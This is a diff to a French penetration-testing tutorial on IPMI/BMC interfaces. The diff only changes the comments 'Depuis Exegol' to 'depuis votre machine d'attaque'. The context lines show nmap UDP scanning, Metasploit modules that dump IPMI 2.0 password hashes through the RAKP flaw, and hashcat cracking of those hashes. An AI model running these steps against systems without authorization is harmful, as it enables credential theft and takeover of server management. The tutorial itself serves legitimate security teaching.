@@ -54,7 +54,7 @@ Ces interfaces proposent en général un accès console (KVM over IP), la gestio
 IPMI écoute sur **UDP/623**. Un scan classique en TCP ne le trouvera pas.
 
 ```bash
-# Depuis Exegol - scan UDP ciblé sur le port IPMI
+# Depuis votre machine d'attaque - scan UDP ciblé sur le port IPMI
 sudo nmap -sU --script ipmi-version -p 623 <IP_CIBLE>
 ```
 
@@ -75,7 +75,7 @@ Le champ `PassAuth` révèle les méthodes d'authentification supportées. La pr
 Avec Metasploit :
 
 ```bash
-# Depuis Exegol - identification de la version IPMI
+# Depuis votre machine d'attaque - identification de la version IPMI
 msfconsole -q
 use auxiliary/scanner/ipmi/ipmi_version
 set RHOSTS <IP_CIBLE>
@@ -87,7 +87,7 @@ run
 C'est la faille la plus critique d'IPMI. Le protocole RAKP, utilisé dans IPMI 2.0, transmet un hash du mot de passe **avant** que l'authentification soit terminée. N'importe qui sur le réseau peut récupérer ce hash sans avoir besoin de s'authentifier.
 
 ```bash
-# Depuis Exegol - dump des hash IPMI via Metasploit
+# Depuis votre machine d'attaque - dump des hash IPMI via Metasploit
 msfconsole -q
 use auxiliary/scanner/ipmi/ipmi_dumphashes
 set RHOSTS <IP_CIBLE>
@@ -97,7 +97,7 @@ run
 Le module retourne les noms d'utilisateur et leurs hash au format IPMI2. On peut ensuite les craquer :
 
 ```bash
-# Depuis Exegol - craquage du hash IPMI avec Hashcat
+# Depuis votre machine d'attaque - craquage du hash IPMI avec Hashcat
 hashcat -m 7300 ipmi_hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
